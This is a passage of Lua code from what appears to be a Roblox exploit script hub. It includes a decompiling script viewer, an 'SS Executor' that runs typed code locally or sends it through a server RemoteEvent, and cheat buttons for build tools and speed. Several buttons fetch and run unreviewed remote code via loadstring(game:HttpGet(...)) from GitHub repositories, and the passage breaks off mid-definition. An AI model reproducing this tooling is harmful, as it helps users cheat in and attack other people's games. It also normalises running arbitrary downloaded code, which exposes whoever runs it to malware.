					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		else
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
					local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
					local bar_abs_one = bar_abs_pos + bar_drag
					y = y - mouse_offset
					y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
					y = y - bar_abs_pos
					Class:SetScrollPercent(y/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		end

		function Class:Destroy()
			ScrollFrame:Destroy()
			MouseDrag:Destroy()
			for k in pairs(Class) do
				Class[k] = nil
			end
			setmetatable(Class,nil)
		end

		Update()

		return Class
	end
end

-- End Scrollbar

local scrollBar = ScrollBar(false)
scrollBar.PageIncrement = 16
Create(scrollBar.GUI,{
	Position = UDim2.new(1,0,0,0);
	Size = UDim2.new(0,ScrollBarWidth,1,0);
	Parent = editorGrid;
})

local scrollBarH = ScrollBar(true)
scrollBarH.PageIncrement = 8
Create(scrollBarH.GUI,{
	Position = UDim2.new(0,0,1,0);
	Size = UDim2.new(1,0,0,ScrollBarWidth);
	Parent = editorGrid;
})

local entries = {}

local grid = {}

local count = 1
local xCount = 1

local lineSpan = 0

for i = 0,490,8 do
	local newRow = {}
	for j = 0,390,16 do
		local cellText = Instance.new("TextLabel",editorGrid)
		cellText.BackgroundTransparency = 1
		cellText.BorderSizePixel = 0
		cellText.Text = ""
		cellText.Position = UDim2.new(0,i,0,j)
		cellText.Size = UDim2.new(0,8,0,16)
		cellText.Font = Enum.Font.SourceSans
		cellText.FontSize = Enum.FontSize.Size18
		table.insert(newRow,cellText)
		xCount = xCount + 1
	end
	table.insert(grid,newRow)
	count = count + 1
	xCount = 1
end

local syntaxHighlightList = {
	{["Keyword"] = "for", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "local", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "if", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "then", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "do", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "while", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "end", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "function", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "string", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "table", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "game", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "workspace", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "return", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "break", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "elseif", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "in", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "pairs", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "ipairs", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true}
}

function checkMouseInGui(gui)
	if gui == nil then return false end
	local plrMouse = game.Players.LocalPlayer:GetMouse()
	local guiPosition = gui.AbsolutePosition
	local guiSize = gui.AbsoluteSize	
	
	if plrMouse.X >= guiPosition.x and plrMouse.X <= guiPosition.x + guiSize.x and plrMouse.Y >= guiPosition.y and plrMouse.Y <= guiPosition.y + guiSize.y then
		return true
	else
		return false
	end
end

function AddZeros(num,reach)
	local toConvert = tostring(num)
	while #toConvert < reach do
		toConvert = " "..toConvert
	end
	return toConvert
end

function buildScript(source,xOff,yOff,override)
	local buildingRows = true
	local buildScr = source
	
	local totalLines = 0
	
	--print(xOff,yOff)
	
	if currentSource ~= source then
		currentSource = source
	end

	if override then
		currentSource = source
		entries = {}
		while buildingRows do
			local x,y = string.find(buildScr,"\n")
			if x and y then
				table.insert(entries,string.sub(buildScr,1,y))
				buildScr = string.sub(buildScr,y+1,string.len(buildScr))
			else
				buildingRows = false
				table.insert(entries,buildScr)
			end
		end
	end
	
	totalLines = #entries
	lineSpan = #tostring(totalLines)
	
	if lineSpan == 1 then lineSpan = 2 end
	
	local currentRow = 1
	local currentColumn = 2 + lineSpan
	
	local colorTime = 0
	local colorReplace = nil
	
	local inString = false
	
	local workingEntries = entries
	
	--[[
	for i,v in pairs(entries) do
		table.insert(workingEntries,v)
	end
	
	for i = 1,yOff do
		table.remove(workingEntries,1)
	end
	--]]
	
	local delayance = xOff

	for i = 1,#grid do
		for j = 1,#grid[i] do
			if i <= lineSpan then
				local newNum = AddZeros(yOff + j,lineSpan)
				local newDigit =  string.sub(newNum,i,i)
				if newDigit == " " then
					grid[i][j].Text = ""
				else
					grid[i][j].Text = newDigit
				end
				grid[i][j].BackgroundTransparency = 0
				grid[i][j].BackgroundColor3 = Color3.new(163/255, 162/255, 165/255)
				--grid[i][j].Font = Enum.Font.SourceSansBold
			elseif i == lineSpan + 1 then
				grid[i][j].Text = ""
				grid[i][j].BackgroundTransparency = 0
				grid[i][j].BackgroundColor3 = Color3.new(200/255, 200/255, 200/255)
				--grid[i][j].Font = Enum.Font.SourceSans
			else
				grid[i][j].Text = ""
				grid[i][j].BackgroundTransparency = 1
				--grid[i][j].Font = Enum.Font.SourceSans
			end
		end
	end
	
	while true do
		if currentRow > #workingEntries or currentRow > #grid[1] then break end
		local entry = workingEntries[currentRow+yOff]
		while string.len(entry) > 0 do
			if string.sub(entry,1,1) == "\t" then entry = "    "..string.sub(entry,2) end
			
			if currentColumn > #grid then break end
			
			if delayance == 0 then
				grid[currentColumn][currentRow].Text = string.sub(entry,1,1)
			end
			
			-- Coloring
			
			if not inString then
				for i,v in pairs(syntaxHighlightList) do
					if string.sub(entry,1,string.len(v["Keyword"])) == v["Keyword"] then
						if v["Independent"] then
							local outCheck = string.len(v["Keyword"])+1
							local outEntry = string.sub(entry,outCheck,outCheck)
							if not string.find(outEntry,"%w") then
								colorTime = string.len(v["Keyword"])
								colorReplace = v["Color"]
							end
						else
							colorTime = string.len(v["Keyword"])
							colorReplace = v["Color"]
						end
					end
				end
			end
			
			if string.sub(entry,1,1) == "\"" and string.match(entry,"\".+\"") then
				inString = true
				colorTime = string.len(string.match(entry,"\".+\""))
				colorReplace = Color3.new(170/255, 0, 1)
			end
			
			if colorTime > 0 then
				colorTime = colorTime - 1
				grid[currentColumn][currentRow].TextColor3 = colorReplace
				if colorTime == 0 then inString = false end
			else
				grid[currentColumn][currentRow].TextColor3 = Color3.new(0,0,0)
				inString = false
			end
			
			if delayance == 0 then
				currentColumn = currentColumn + 1
			else
				delayance = delayance - 1
			end
			entry = string.sub(entry,2,string.len(entry))
		end
		currentRow = currentRow + 1
		currentColumn = 2 + lineSpan
		colorTime = 0
		delayance = xOff
		inString = false
	end
end

function scrollBar.UpdateCallback(self)
	scrollBar.TotalSpace = #entries * 16
	scrollBar.VisibleSpace = editorGrid.AbsoluteSize.Y
	buildScript(currentSource,math.floor(scrollBarH.ScrollIndex/8),math.floor(scrollBar.ScrollIndex/16))
end

function scrollBarH.UpdateCallback(self)
	scrollBarH.TotalSpace = (getLongestEntry(entries) + 1 + lineSpan) * 8
	scrollBarH.VisibleSpace = editorGrid.AbsoluteSize.X
	buildScript(currentSource,math.floor(scrollBarH.ScrollIndex/8),math.floor(scrollBar.ScrollIndex/16))
end

function getLongestEntry(tab)
	local longest = 0
	for i,v in pairs(tab) do
		if string.len(v) > longest then
			longest = string.len(v)
		end
	end
	return longest
end

function openScript(scrObj)
	if scrObj:IsA("LocalScript") then
		scrObj.Archivable = true
		scrObj = scrObj:Clone()
		scrObj.Disabled = true
	end
	
	local scrName = scrObj.Name
	local scrSource = decompile(scrObj)
	
	table.insert(memoryScripts,{Name = scrName,Source = scrSource})
	
	local newTab = entryTemplate:Clone()
	newTab.Button.Text = scrName
	newTab.Position = UDim2.new(0,#scriptBar:GetChildren() * 100,0,0)
	newTab.Visible = true
	
	newTab.Button.MouseButton1Down:connect(function()
		for i,v in pairs(scriptBar:GetChildren()) do
			if v == newTab then
				editingIndex = i
				buildScript(memoryScripts[i].Source,0,0,true)
				scrollBar:ScrollTo(1)
				scrollBar:Update()
				scrollBarH:ScrollTo(1)
				scrollBarH:Update()
			end
		end
	end)
	
	newTab.Close.MouseButton1Click:connect(function()
		for i,v in pairs(scriptBar:GetChildren()) do
			if v == newTab then
				table.remove(memoryScripts,i)
				if editingIndex == i then
					editingIndex = #memoryScripts
					if editingIndex > 0 then
						buildScript(memoryScripts[#memoryScripts].Source,0,0,true)
					else
						buildScript("",0,0,true)
					end
				end
				
				scrollBar:ScrollTo(1)
				scrollBar:Update()
				scrollBarH:ScrollTo(1)
				scrollBarH:Update()
				
				for i2 = i,#scriptBar:GetChildren() do
					scriptBar:GetChildren()[i2].Position = scriptBar:GetChildren()[i2].Position + UDim2.new(0,-100,0,0)
				end
				if editingIndex > i then
					editingIndex = editingIndex - 1
				end
				newTab:Destroy()
			end
		end
	end)
	
	editingIndex = #memoryScripts
	buildScript(scrSource,0,0,true)
	
	newTab.Parent = scriptBar
end

function updateScriptBar()
	local entryCount = 0
	
	scriptBarLeft.Active = false
	scriptBarLeft.AutoButtonColor = false
	for i,v in pairs(scriptBarLeft["Arrow Graphic"]:GetChildren()) do
		v.BackgroundTransparency = 0.7
	end
	scriptBarRight.Active = false
	scriptBarRight.AutoButtonColor = false
	for i,v in pairs(scriptBarRight["Arrow Graphic"]:GetChildren()) do
		v.BackgroundTransparency = 0.7
	end
	for i,v in pairs(scriptBar:GetChildren()) do
		if v.Position.X.Offset < 0 then
			scriptBarLeft.Active = true
			scriptBarLeft.AutoButtonColor = true
			for i,v in pairs(scriptBarLeft["Arrow Graphic"]:GetChildren()) do
				v.BackgroundTransparency = 0
			end
		elseif v.Position.X.Offset >= 0 then
			entryCount = entryCount + 1
			if entryCount == 5 then
				scriptBarRight.Active = true
				scriptBarRight.AutoButtonColor = true
				for i,v in pairs(scriptBarRight["Arrow Graphic"]:GetChildren()) do
					v.BackgroundTransparency = 0
				end
			end
		end
	end
end

scriptBar.ChildAdded:connect(updateScriptBar)
scriptBar.ChildRemoved:connect(updateScriptBar)

scriptBarLeft.MouseButton1Click:connect(function()
	if scriptBarLeft.Active == false then return end
	for i,v in pairs(scriptBar:GetChildren()) do
		v.Position = v.Position + UDim2.new(0,100,0,0)
	end
	updateScriptBar()
end)

scriptBarRight.MouseButton1Click:connect(function()
	if scriptBarRight.Active == false then return end
	for i,v in pairs(scriptBar:GetChildren()) do
		v.Position = v.Position + UDim2.new(0,-100,0,0)
	end
	updateScriptBar()
end)

mouse.Button1Down:connect(function()
	if checkMouseInGui(editorGrid) then
		--print("LETS EDIT!")
	end
end)

openEvent.Event:connect(function(...)
	top.Visible = true
	local args = {...}
	if #args > 0 then
		openScript(args[1])
	end
end)

clipboardButton.MouseButton1Click:connect(function()
	if Clipboard and Clipboard.set then
		Clipboard.set(currentSource)
	elseif CopyString then
		CopyString(currentSource)
	end
end)

closeButton.MouseButton1Click:connect(function()
	top.Visible = false
end)

--[[
local scr = script.Parent:WaitForChild("Scr")
local scr2 = script.Parent:WaitForChild("Scr2")
local scr3 = script.Parent:WaitForChild("Scr3")
local scr4 = script.Parent:WaitForChild("TOS")
local scr5 = script.Parent:WaitForChild("HW")
--]]

buildScript("",0,0,true)
--[[
openScript(scr)
openScript(scr2)
openScript(scr3)
openScript(scr4)
openScript(scr5)
--]]

scrollBar:Update()
scrollBarH:Update()
end)
end)
Tab3Section:NewButton("Doors Script", "Opens the Doors GUI", function(DRS)
loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Doors/Script.lua"))()
end)
Tab3Section:NewButton("Ragdoll System Test Script", "Opens the RST Script", function(RST)
loadstring(game:GetObjects('rbxassetid://2776192633')[1].Source)()
end)
Tab3Section:NewButton("SS Executor", "Opens a SS Executor", function(SSE)
--Server Side / Internal By Server Side Script!

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextBox = Instance.new("TextBox")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local Frame_2 = Instance.new("Frame")
local TextButton_4 = Instance.new("TextButton")
local TextButton_5 = Instance.new("TextButton")
local TextButton_6 = Instance.new("TextButton")

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(63, 8, 8)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.282012194, 0, 0.260122687, 0)
Frame.Size = UDim2.new(0, 572, 0, 390)

TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.0297202803, 0, 0.0435897447, 0)
TextBox.Size = UDim2.new(0, 537, 0, 276)
TextBox.Font = Enum.Font.SourceSans
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox.TextSize = 20.000
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(35, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.0297202803, 0, 0.807692289, 0)
TextButton.Size = UDim2.new(0, 200, 0, 50)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Execute"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 28.000
TextButton.TextWrapped = true

TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(35, 0, 0)
TextButton_2.BorderSizePixel = 0
TextButton_2.Position = UDim2.new(0.618881166, 0, 0.807692289, 0)
TextButton_2.Size = UDim2.new(0, 200, 0, 50)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "Server Side Execute"
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextSize = 28.000
TextButton_2.TextWrapped = true

TextButton_3.Parent = Frame
TextButton_3.BackgroundColor3 = Color3.fromRGB(35, 0, 0)
TextButton_3.BorderSizePixel = 0
TextButton_3.Position = UDim2.new(0.41083914, 0, 0.807692289, 0)
TextButton_3.Size = UDim2.new(0, 102, 0, 50)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "Clear"
TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.TextSize = 28.000
TextButton_3.TextWrapped = true

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(43, 0, 0)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(1, 0, 0, 0)
Frame_2.Size = UDim2.new(0, 93, 0, 390)

TextButton_4.Parent = Frame_2
TextButton_4.BackgroundColor3 = Color3.fromRGB(35, 0, 0)
TextButton_4.BorderSizePixel = 0
TextButton_4.Position = UDim2.new(0.0752688199, 0, 0.146153852, 0)
TextButton_4.Size = UDim2.new(0, 78, 0, 76)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "Btools"
TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.TextSize = 29.000

TextButton_5.Parent = Frame_2
TextButton_5.BackgroundColor3 = Color3.fromRGB(35, 0, 0)
TextButton_5.BorderSizePixel = 0
TextButton_5.Position = UDim2.new(0.0752688199, 0, 0.402564108, 0)
TextButton_5.Size = UDim2.new(0, 78, 0, 76)
TextButton_5.Font = Enum.Font.SourceSans
TextButton_5.Text = "Fast"
TextButton_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_5.TextSize = 29.000

TextButton_6.Parent = Frame_2
TextButton_6.BackgroundColor3 = Color3.fromRGB(35, 0, 0)
TextButton_6.BorderSizePixel = 0
TextButton_6.Position = UDim2.new(0.0752688199, 0, 0.658974409, 0)
TextButton_6.Size = UDim2.new(0, 78, 0, 76)
TextButton_6.Font = Enum.Font.SourceSans
TextButton_6.Text = "Close"
TextButton_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_6.TextSize = 29.000


local function ZIUYTVS_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	script.Parent.MouseButton1Click:Connect(function()
		assert(loadstring(script.Parent.Parent.TextBox.Text))()
	end)
end
coroutine.wrap(ZIUYTVS_fake_script)()
local function HASJH_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.RemoteEvent:FireServer(script.Parent.Parent.TextBox.Text)
	end)
end
coroutine.wrap(HASJH_fake_script)()
local function UAZSPPI_fake_script() -- TextButton_3.LocalScript 
	local script = Instance.new('LocalScript', TextButton_3)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.TextBox.Text = "Cleared!"
		wait(.1)
		script.Parent.Parent.TextBox.Text = ""
	end)
end
coroutine.wrap(UAZSPPI_fake_script)()
local function ACWZSQI_fake_script() -- TextButton_4.LocalScript 
	local script = Instance.new('LocalScript', TextButton_4)

	script.Parent.MouseButton1Click:Connect(function()
		Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 2
		Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 3
		Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 4
	end)
end
coroutine.wrap(ACWZSQI_fake_script)()
local function YRAT_fake_script() -- TextButton_5.LocalScript 
	local script = Instance.new('LocalScript', TextButton_5)

	script.Parent.MouseButton1Click:Connect(function()
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100
	end)
end
coroutine.wrap(YRAT_fake_script)()
local function RTRPEIN_fake_script() -- TextButton_6.Script 
	local script = Instance.new('Script', TextButton_6)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Parent:Destroy()
	end)
end
coroutine.wrap(RTRPEIN_fake_script)()
local function ANEL_fake_script() -- Frame.Dragable 
	local script = Instance.new('LocalScript', Frame)

	script.Parent.Active = true
	script.Parent.Draggable = true
end
coroutine.wrap(ANEL_fake_script)()
end)
Tab3Section:NewButton("Mint Hub", "Opens MH", function(MH)
-- This Script Hub was made by CantankerousStrategy

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local SideBar = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local ScriptsButton = Instance.new("TextButton")
local bar = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local CreditsButton = Instance.new("TextButton")
local bar_2 = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")
local ExtrasButton = Instance.new("TextButton")
local bar_3 = Instance.new("Frame")
local UICorner_5 = Instance.new("UICorner")
local TopBar = Instance.new("Frame")
local UICorner_6 = Instance.new("UICorner")
local TITLE = Instance.new("TextLabel")
local ExtrasFrame = Instance.new("Frame")
local UICorner_7 = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local CreditsFrame = Instance.new("Frame")
local UICorner_8 = Instance.new("UICorner")
local TextLabel_3 = Instance.new("TextLabel")
local ScriptsFrame = Instance.new("Frame")
local UICorner_9 = Instance.new("UICorner")
local ControlGUI = Instance.new("TextButton")
local FERevengeHands = Instance.new("TextButton")
local TheGlitch = Instance.new("TextButton")
local ChaosDeusSword = Instance.new("TextButton")
local Vereus = Instance.new("TextButton")
local RoadRollerDance = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.CoreGui

main.Name = "main"
main.Parent = ScreenGui
main.BackgroundColor3 = Color3.fromRGB(72, 72, 72)
main.BorderSizePixel = 0
main.Position = UDim2.new(0.0892388448, 0, 0.233672038, 0)
main.Size = UDim2.new(0, 570, 0, 437)
main.Active = true
main.Draggable = true

UICorner.Parent = main

SideBar.Name = "SideBar"
SideBar.Parent = main
SideBar.BackgroundColor3 = Color3.fromRGB(62, 180, 137)
SideBar.Position = UDim2.new(0, 0, 0.00228832942, 0)
SideBar.Size = UDim2.new(0, 100, 0, 436)

UICorner_2.Parent = SideBar

ScriptsButton.Name = "ScriptsButton"
ScriptsButton.Parent = SideBar
ScriptsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScriptsButton.BackgroundTransparency = 1.000
ScriptsButton.Position = UDim2.new(0, 0, 0.167431191, 0)
ScriptsButton.Size = UDim2.new(0, 100, 0, 64)
ScriptsButton.Font = Enum.Font.Jura
ScriptsButton.Text = "Scripts"
ScriptsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ScriptsButton.TextSize = 20.000

bar.Name = "bar"
bar.Parent = ScriptsButton
bar.AnchorPoint = Vector2.new(0.5, 0.5)
bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
bar.BorderSizePixel = 0
bar.Position = UDim2.new(0.490000427, 0, 0.734375, 0)
bar.Size = UDim2.new(0, 91, 0, 4)
bar.ZIndex = 2

UICorner_3.Parent = bar

CreditsButton.Name = "CreditsButton"
CreditsButton.Parent = SideBar
CreditsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CreditsButton.BackgroundTransparency = 1.000
CreditsButton.Position = UDim2.new(0, 0, 0.31422019, 0)
CreditsButton.Size = UDim2.new(0, 100, 0, 64)
CreditsButton.Font = Enum.Font.Jura
CreditsButton.Text = "Credits"
CreditsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CreditsButton.TextSize = 20.000

bar_2.Name = "bar"
bar_2.Parent = CreditsButton
bar_2.AnchorPoint = Vector2.new(0.5, 0.5)
bar_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
bar_2.BorderSizePixel = 0
bar_2.Position = UDim2.new(0.490000427, 0, 0.734375, 0)
bar_2.Size = UDim2.new(0, 91, 0, 4)
bar_2.ZIndex = 2

UICorner_4.Parent = bar_2

ExtrasButton.Name = "ExtrasButton"
ExtrasButton.Parent = SideBar
ExtrasButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ExtrasButton.BackgroundTransparency = 1.000
ExtrasButton.Position = UDim2.new(0, 0, 0.461009175, 0)
ExtrasButton.Size = UDim2.new(0, 100, 0, 64)
ExtrasButton.Font = Enum.Font.Jura
ExtrasButton.Text = "Extras"
ExtrasButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ExtrasButton.TextSize = 20.000

bar_3.Name = "bar"
bar_3.Parent = ExtrasButton
bar_3.AnchorPoint = Vector2.new(0.5, 0.5)
bar_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
bar_3.BorderSizePixel = 0
bar_3.Position = UDim2.new(0.490000427, 0, 0.734375, 0)
bar_3.Size = UDim2.new(0, 91, 0, 4)
bar_3.ZIndex = 2

UICorner_5.Parent = bar_3

TopBar.Name = "TopBar"
TopBar.Parent = main
TopBar.BackgroundColor3 = Color3.fromRGB(62, 180, 137)
TopBar.Position = UDim2.new(0, 0, -0.00686497986, 0)
TopBar.Size = UDim2.new(0, 570, 0, 54)

UICorner_6.Parent = TopBar

TITLE.Name = "TITLE"
TITLE.Parent = TopBar
TITLE.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TITLE.BackgroundTransparency = 1.000
TITLE.BorderColor3 = Color3.fromRGB(0, 0, 0)
TITLE.Position = UDim2.new(0, 0, 0.0370370373, 0)
TITLE.Size = UDim2.new(0, 100, 0, 50)
TITLE.Font = Enum.Font.Jura
TITLE.Text = "MINT HUB"
TITLE.TextColor3 = Color3.fromRGB(255, 255, 255)
TITLE.TextSize = 20.000

ExtrasFrame.Name = "ExtrasFrame"
ExtrasFrame.Parent = main
ExtrasFrame.BackgroundColor3 = Color3.fromRGB(72, 72, 72)
ExtrasFrame.Position = UDim2.new(0.174153894, 0, 0.115472652, 0)
ExtrasFrame.Size = UDim2.new(0, 470, 0, 386)
ExtrasFrame.Visible = false

UICorner_7.Parent = ExtrasFrame

TextLabel.Parent = ExtrasFrame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.012765957, 0, 0.152849734, 0)
TextLabel.Size = UDim2.new(0, 464, 0, 50)
TextLabel.Font = Enum.Font.Jura
TextLabel.Text = "Have any suggestions?"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 19.000

TextLabel_2.Parent = ExtrasFrame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0, 0, 0.331606209, 0)
TextLabel_2.Size = UDim2.new(0, 470, 0, 50)
TextLabel_2.Font = Enum.Font.Jura
TextLabel_2.Text = "Join the Discord Server: https://discord.gg/EUN5waqZ"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 19.000

CreditsFrame.Name = "CreditsFrame"
CreditsFrame.Parent = main
CreditsFrame.BackgroundColor3 = Color3.fromRGB(72, 72, 72)
CreditsFrame.Position = UDim2.new(0.174153879, 0, 0.115472637, 0)
CreditsFrame.Size = UDim2.new(0, 470, 0, 386)
CreditsFrame.Visible = false

UICorner_8.Parent = CreditsFrame

TextLabel_3.Parent = CreditsFrame
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(0.100000001, 0, 0.0958549231, 0)
TextLabel_3.Size = UDim2.new(0, 359, 0, 50)
TextLabel_3.Font = Enum.Font.Jura
TextLabel_3.Text = "Made By CantankerousStrategy"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextSize = 19.000

ScriptsFrame.Name = "ScriptsFrame"
ScriptsFrame.Parent = main
ScriptsFrame.BackgroundColor3 = Color3.fromRGB(72, 72, 72)
ScriptsFrame.Position = UDim2.new(0.174153879, 0, 0.110895976, 0)
ScriptsFrame.Size = UDim2.new(0, 470, 0, 386)
ScriptsFrame.Visible = false

UICorner_9.Parent = ScriptsFrame

ControlGUI.Name = "ControlGUI"
ControlGUI.Parent = ScriptsFrame
ControlGUI.BackgroundColor3 = Color3.fromRGB(62, 180, 137)
ControlGUI.BorderSizePixel = 0
ControlGUI.Position = UDim2.new(0.0957446843, 0, 0.07772021, 0)
ControlGUI.Size = UDim2.new(0, 166, 0, 50)
ControlGUI.Font = Enum.Font.Jura
ControlGUI.Text = "FE CONTROL GUI"
ControlGUI.TextColor3 = Color3.fromRGB(255, 255, 255)
ControlGUI.TextSize = 17.000
ControlGUI.MouseButton1Down:Connect (function()
	loadstring(game:HttpGet(("https://raw.githubusercontent.com/KRNL2/asdasdas/main/control"), true))()
end)

FERevengeHands.Name = "FERevengeHands"
FERevengeHands.Parent = ScriptsFrame
FERevengeHands.BackgroundColor3 = Color3.fromRGB(62, 180, 137)
FERevengeHands.BorderSizePixel = 0
FERevengeHands.Position = UDim2.new(0.551063836, 0, 0.07772021, 0)
FERevengeHands.Size = UDim2.new(0, 166, 0, 50)
FERevengeHands.Font = Enum.Font.Jura
FERevengeHands.Text = "FE REVENGE HANDS"
FERevengeHands.TextColor3 = Color3.fromRGB(255, 255, 255)
FERevengeHands.TextSize = 17.000
FERevengeHands.MouseButton1Down:connect (function()
	loadstring(game:HttpGet(("https://raw.githubusercontent.com/KRNL2/asdasdasd/main/Revenge%20Hands"), true))()
end)

TheGlitch.Name = "TheGlitch"
TheGlitch.Parent = ScriptsFrame
TheGlitch.BackgroundColor3 = Color3.fromRGB(62, 180, 137)
TheGlitch.BorderSizePixel = 0
TheGlitch.Position = UDim2.new(0.0957446843, 0, 0.370466322, 0)
TheGlitch.Size = UDim2.new(0, 166, 0, 50)
TheGlitch.Font = Enum.Font.Jura
TheGlitch.Text = "THE GLITCH"
TheGlitch.TextColor3 = Color3.fromRGB(255, 255, 255)
TheGlitch.TextSize = 17.000
TheGlitch.MouseButton1Down:connect (function()
	loadstring(game:HttpGet(("https://raw.githubusercontent.com/KRNL2/haker/main/The%20Glitch"), true))()
end)

ChaosDeusSword.Name = "ChaosDeusSword"
ChaosDeusSword.Parent = ScriptsFrame
ChaosDeusSword.BackgroundColor3 = Color3.fromRGB(62, 180, 137)
ChaosDeusSword.BorderSizePixel = 0
ChaosDeusSword.Position = UDim2.new(0.0957446843, 0, 0.658031106, 0)
ChaosDeusSword.Size = UDim2.new(0, 166, 0, 50)
ChaosDeusSword.Font = Enum.Font.Jura
ChaosDeusSword.Text = "CHAOS DEUS SWORD"
